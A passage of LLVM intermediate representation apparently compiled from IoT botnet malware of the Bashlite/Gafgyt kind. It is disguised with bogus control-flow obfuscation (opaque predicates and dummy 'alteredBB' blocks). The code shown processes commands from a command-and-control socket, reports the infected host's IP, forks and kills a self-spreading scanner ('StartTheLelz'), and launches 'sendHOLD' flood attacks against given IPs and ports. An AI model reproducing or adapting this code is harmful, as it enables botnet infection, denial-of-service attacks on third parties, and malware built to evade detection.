  %355 = call i32 @close(i32 %354)
  %356 = load i32, i32* %8, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %357
  %359 = getelementptr inbounds %struct.state_t, %struct.state_t* %358, i32 0, i32 1
  store i8 0, i8* %359, align 4
  br label %360

; <label>:360:                                    ; preds = %349, %originalBBpart292
  br label %361

; <label>:361:                                    ; preds = %360, %originalBBpart258, %141, %originalBBpart24
  %362 = load i32, i32* @x.77
  %363 = load i32, i32* @y.78
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %361
  %370 = load i32, i32* @x.77
  %371 = load i32, i32* @y.78
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %378

; <label>:378:                                    ; preds = %originalBBpart296
  %379 = load i32, i32* %8, align 4
  %380 = add nsw i32 %379, 1
  store i32 %380, i32* %8, align 4
  br label %71

; <label>:381:                                    ; preds = %71
  %382 = load i32, i32* @x.77
  %383 = load i32, i32* @y.78
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %381
  %390 = load i32, i32* @x.77
  %391 = load i32, i32* @y.78
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %50

; <label>:398:                                    ; preds = %originalBBpart2
  %399 = load i32, i32* @x.77
  %400 = load i32, i32* @y.78
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %398
  %407 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %407)
  %408 = load i32, i32* @x.77
  %409 = load i32, i32* @y.78
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %416

; <label>:416:                                    ; preds = %originalBBpart2104, %33
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %50
  %417 = load i32, i32* %17, align 4
  %418 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %419 = icmp sgt i32 %417, %418
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  %420 = load i32, i32* %8, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %421
  %423 = getelementptr inbounds %struct.state_t, %struct.state_t* %422, i32 0, i32 1
  %424 = load i8, i8* %423, align 4
  %425 = zext i8 %424 to i32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %152
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %169
  %426 = load i32, i32* %8, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %427
  %429 = getelementptr inbounds %struct.state_t, %struct.state_t* %428, i32 0, i32 0
  %430 = load i32, i32* %429, align 8
  %_ = sub i32 %430, 64
  %gen = mul i32 %_, 64
  %_11 = shl i32 %430, 64
  %_12 = shl i32 %430, 64
  %431 = srem i32 %430, 64
  %432 = zext i32 %431 to i64
  %_13 = sub i64 1, %432
  %gen14 = mul i64 %_13, %432
  %_15 = sub i64 1, %432
  %gen16 = mul i64 %_15, %432
  %_17 = sub i64 1, %432
  %gen18 = mul i64 %_17, %432
  %_19 = sub i64 1, %432
  %gen20 = mul i64 %_19, %432
  %_21 = sub i64 0, 1
  %gen22 = add i64 %_21, %432
  %433 = shl i64 1, %432
  %434 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %435 = load i32, i32* %8, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %436
  %438 = getelementptr inbounds %struct.state_t, %struct.state_t* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 8
  %_23 = sub i32 %439, 64
  %gen24 = mul i32 %_23, 64
  %_25 = shl i32 %439, 64
  %_26 = sub i32 0, %439
  %gen27 = add i32 %_26, 64
  %_28 = shl i32 %439, 64
  %_29 = shl i32 %439, 64
  %_30 = sub i32 0, %439
  %gen31 = add i32 %_30, 64
  %440 = sdiv i32 %439, 64
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds [16 x i64], [16 x i64]* %434, i64 0, i64 %441
  %443 = load i64, i64* %442, align 8
  %_32 = sub i64 %443, %433
  %gen33 = mul i64 %_32, %433
  %_34 = sub i64 %443, %433
  %gen35 = mul i64 %_34, %433
  %_36 = sub i64 %443, %433
  %gen37 = mul i64 %_36, %433
  %_38 = sub i64 0, %443
  %gen39 = add i64 %_38, %433
  %_40 = sub i64 %443, %433
  %gen41 = mul i64 %_40, %433
  %444 = or i64 %443, %433
  store i64 %444, i64* %442, align 8
  %445 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %445, align 8
  %446 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %446, align 8
  %447 = load i32, i32* %8, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %448
  %450 = getelementptr inbounds %struct.state_t, %struct.state_t* %449, i32 0, i32 0
  %451 = load i32, i32* %450, align 8
  %_42 = shl i32 %451, 1
  %_43 = sub i32 0, %451
  %gen44 = add i32 %_43, 1
  %_45 = shl i32 %451, 1
  %_46 = sub i32 %451, 1
  %gen47 = mul i32 %_46, 1
  %_48 = shl i32 %451, 1
  %452 = add nsw i32 %451, 1
  %453 = call i32 @select(i32 %452, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %453, i32* %15, align 4
  %454 = load i32, i32* %15, align 4
  %455 = icmp eq i32 %454, 1
  br label %originalBB10

originalBB52alteredBB:                            ; preds = %originalBB52, %242
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %274
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %302
  %456 = load i32, i32* %8, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %457
  %459 = getelementptr inbounds %struct.state_t, %struct.state_t* %458, i32 0, i32 0
  %460 = load i32, i32* %459, align 8
  %_61 = sub i32 0, %460
  %gen62 = add i32 %_61, 64
  %_63 = sub i32 0, %460
  %gen64 = add i32 %_63, 64
  %_65 = shl i32 %460, 64
  %_66 = sub i32 %460, 64
  %gen67 = mul i32 %_66, 64
  %_68 = shl i32 %460, 64
  %461 = srem i32 %460, 64
  %462 = zext i32 %461 to i64
  %_69 = shl i64 1, %462
  %_70 = sub i64 1, %462
  %gen71 = mul i64 %_70, %462
  %_72 = sub i64 0, 1
  %gen73 = add i64 %_72, %462
  %_74 = shl i64 1, %462
  %_75 = sub i64 0, 1
  %gen76 = add i64 %_75, %462
  %_77 = sub i64 1, %462
  %gen78 = mul i64 %_77, %462
  %463 = shl i64 1, %462
  %464 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %465 = load i32, i32* %8, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %466
  %468 = getelementptr inbounds %struct.state_t, %struct.state_t* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 8
  %_79 = sub i32 0, %469
  %gen80 = add i32 %_79, 64
  %470 = sdiv i32 %469, 64
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds [16 x i64], [16 x i64]* %464, i64 0, i64 %471
  %473 = load i64, i64* %472, align 8
  %_81 = shl i64 %473, %463
  %_82 = shl i64 %473, %463
  %_83 = sub i64 0, %473
  %gen84 = add i64 %_83, %463
  %_85 = sub i64 %473, %463
  %gen86 = mul i64 %_85, %463
  %474 = or i64 %473, %463
  store i64 %474, i64* %472, align 8
  %475 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %475, align 8
  %476 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %476, align 8
  %477 = load i32, i32* %8, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %478
  %480 = getelementptr inbounds %struct.state_t, %struct.state_t* %479, i32 0, i32 0
  %481 = load i32, i32* %480, align 8
  %_87 = sub i32 0, %481
  %gen88 = add i32 %_87, 1
  %_89 = shl i32 %481, 1
  %_90 = shl i32 %481, 1
  %482 = add nsw i32 %481, 1
  %483 = call i32 @select(i32 %482, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %483, i32* %15, align 4
  %484 = load i32, i32* %15, align 4
  %485 = icmp ne i32 %484, 0
  br label %originalBB60

originalBB94alteredBB:                            ; preds = %originalBB94, %361
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %381
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %398
  %486 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %486)
  br label %originalBB102
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i32, align 4
  %39 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #10
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %64, label %45

; <label>:45:                                     ; preds = %2
  %46 = load i32, i32* @x.79
  %47 = load i32, i32* @y.80
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i32 0, i32 0))
  %56 = load i32, i32* @x.79
  %57 = load i32, i32* @y.80
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %1413

; <label>:64:                                     ; preds = %2
  %65 = load i32, i32* @x.79
  %66 = load i32, i32* @y.80
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %64
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 0
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @strcmp(i8* %75, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i32 0, i32 0)) #10
  %77 = icmp ne i32 %76, 0
  %78 = load i32, i32* @x.79
  %79 = load i32, i32* @y.80
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %77, label %91, label %86

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %89 = call i8* @inet_ntoa(i32 %88) #2
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %87, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %89)
  br label %1413

; <label>:91:                                     ; preds = %originalBBpart24
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @strcmp(i8* %94, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i32 0, i32 0)) #10
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %207, label %97

; <label>:97:                                     ; preds = %91
  %98 = load i32, i32* %3, align 4
  %99 = icmp ne i32 %98, 2
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %97
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = call i32 (i32, i8*, ...) @sockprintf(i32 %101, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.94, i32 0, i32 0))
  br label %1413

; <label>:103:                                    ; preds = %97
  %104 = load i8**, i8*** %4, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 1
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @strcmp(i8* %106, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %134, label %109

; <label>:109:                                    ; preds = %103
  %110 = load i32, i32* @scanPid, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %109
  br label %1413

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* @x.79
  %115 = load i32, i32* @y.80
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i32, i32* @scanPid, align 4
  %123 = call i32 @kill(i32 %122, i32 9) #2
  %124 = load i32, i32* @mainCommSock, align 4
  %125 = call i32 (i32, i8*, ...) @sockprintf(i32 %124, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.96, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  %126 = load i32, i32* @x.79
  %127 = load i32, i32* @y.80
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %134

; <label>:134:                                    ; preds = %originalBBpart28, %103
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 1
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @strcmp(i8* %137, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.97, i32 0, i32 0)) #10
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %190, label %140

; <label>:140:                                    ; preds = %134
  %141 = load i32, i32* @scanPid, align 4
  %142 = icmp ne i32 %141, 0
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %140
  br label %1413

; <label>:144:                                    ; preds = %140
  %145 = load i32, i32* @x.79
  %146 = load i32, i32* @y.80
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %144
  %153 = call i32 @fork() #2
  store i32 %153, i32* %6, align 4
  %154 = load i32, i32* %6, align 4
  %155 = icmp ugt i32 %154, 0
  %156 = load i32, i32* @x.79
  %157 = load i32, i32* @y.80
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %155, label %164, label %182

; <label>:164:                                    ; preds = %originalBBpart212
  %165 = load i32, i32* @x.79
  %166 = load i32, i32* @y.80
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %164
  %173 = load i32, i32* %6, align 4
  store i32 %173, i32* @scanPid, align 4
  %174 = load i32, i32* @x.79
  %175 = load i32, i32* @y.80
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %1413

; <label>:182:                                    ; preds = %originalBBpart212
  %183 = load i32, i32* %6, align 4
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %182
  br label %1413

; <label>:186:                                    ; preds = %182
  br label %187

; <label>:187:                                    ; preds = %186
  %188 = load i32, i32* @mainCommSock, align 4
  %189 = call i32 (i32, i8*, ...) @sockprintf(i32 %188, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.98, i32 0, i32 0))
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:190:                                    ; preds = %134
  %191 = load i32, i32* @x.79
  %192 = load i32, i32* @y.80
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %190
  %199 = load i32, i32* @x.79
  %200 = load i32, i32* @y.80
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %207

; <label>:207:                                    ; preds = %originalBBpart220, %91
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 0
  %210 = load i8*, i8** %209, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %333, label %213

; <label>:213:                                    ; preds = %207
  %214 = load i32, i32* %3, align 4
  %215 = icmp slt i32 %214, 4
  br i1 %215, label %228, label %216

; <label>:216:                                    ; preds = %213
  %217 = load i8**, i8*** %4, align 8
  %218 = getelementptr inbounds i8*, i8** %217, i64 2
  %219 = load i8*, i8** %218, align 8
  %220 = call i32 @atoi(i8* %219) #10
  %221 = icmp slt i32 %220, 1
  br i1 %221, label %228, label %222

; <label>:222:                                    ; preds = %216
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 3
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @atoi(i8* %225) #10
  %227 = icmp slt i32 %226, 1
  br i1 %227, label %228, label %229

; <label>:228:                                    ; preds = %222, %216, %213
  br label %1413

; <label>:229:                                    ; preds = %222
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 1
  %232 = load i8*, i8** %231, align 8
  store i8* %232, i8** %7, align 8
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 2
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @atoi(i8* %235) #10
  store i32 %236, i32* %8, align 4
  %237 = load i8**, i8*** %4, align 8
  %238 = getelementptr inbounds i8*, i8** %237, i64 3
  %239 = load i8*, i8** %238, align 8
  %240 = call i32 @atoi(i8* %239) #10
  store i32 %240, i32* %9, align 4
  %241 = load i8*, i8** %7, align 8
  %242 = call i8* @strstr(i8* %241, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %243 = icmp ne i8* %242, null
  br i1 %243, label %244, label %292

; <label>:244:                                    ; preds = %229
  %245 = load i8*, i8** %7, align 8
  %246 = call i8* @strtok(i8* %245, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %246, i8** %10, align 8
  br label %247

; <label>:247:                                    ; preds = %289, %244
  %248 = load i32, i32* @x.79
  %249 = load i32, i32* @y.80
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %247
  %256 = load i8*, i8** %10, align 8
  %257 = icmp ne i8* %256, null
  %258 = load i32, i32* @x.79
  %259 = load i32, i32* @y.80
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %257, label %266, label %291

; <label>:266:                                    ; preds = %originalBBpart224
  %267 = call i32 @listFork()
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %289, label %269

; <label>:269:                                    ; preds = %266
  %270 = load i32, i32* @x.79
  %271 = load i32, i32* @y.80
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %269
  %278 = load i8*, i8** %10, align 8
  %279 = load i32, i32* %8, align 4
  %280 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %278, i32 %279, i32 %280)
  call void @_exit(i32 0) #12
  %281 = load i32, i32* @x.79
  %282 = load i32, i32* @y.80
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  unreachable

; <label>:289:                                    ; preds = %266
  %290 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %290, i8** %10, align 8
  br label %247

; <label>:291:                                    ; preds = %originalBBpart224
  br label %316

; <label>:292:                                    ; preds = %229
  %293 = call i32 @listFork()
  %294 = icmp ne i32 %293, 0
  br i1 %294, label %295, label %296

; <label>:295:                                    ; preds = %292
  br label %1413

; <label>:296:                                    ; preds = %292
  %297 = load i32, i32* @x.79
  %298 = load i32, i32* @y.80
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %296
  %305 = load i8*, i8** %7, align 8
  %306 = load i32, i32* %8, align 4
  %307 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %305, i32 %306, i32 %307)
  call void @_exit(i32 0) #12
  %308 = load i32, i32* @x.79
  %309 = load i32, i32* @y.80
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  unreachable

; <label>:316:                                    ; preds = %291
  %317 = load i32, i32* @x.79
  %318 = load i32, i32* @y.80
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %316
  %325 = load i32, i32* @x.79
  %326 = load i32, i32* @y.80
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %333

; <label>:333:                                    ; preds = %originalBBpart236, %207
  %334 = load i32, i32* @x.79
  %335 = load i32, i32* @y.80
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %333
  %342 = load i8**, i8*** %4, align 8
  %343 = getelementptr inbounds i8*, i8** %342, i64 0
  %344 = load i8*, i8** %343, align 8
  %345 = call i32 @strcmp(i8* %344, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.100, i32 0, i32 0)) #10
  %346 = icmp ne i32 %345, 0
  %347 = load i32, i32* @x.79
  %348 = load i32, i32* @y.80
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %346, label %477, label %355

; <label>:355:                                    ; preds = %originalBBpart240
  %356 = load i32, i32* @x.79
  %357 = load i32, i32* @y.80
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %355
  %364 = load i32, i32* %3, align 4
  %365 = icmp slt i32 %364, 4
  %366 = load i32, i32* @x.79
  %367 = load i32, i32* @y.80
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %365, label %402, label %374

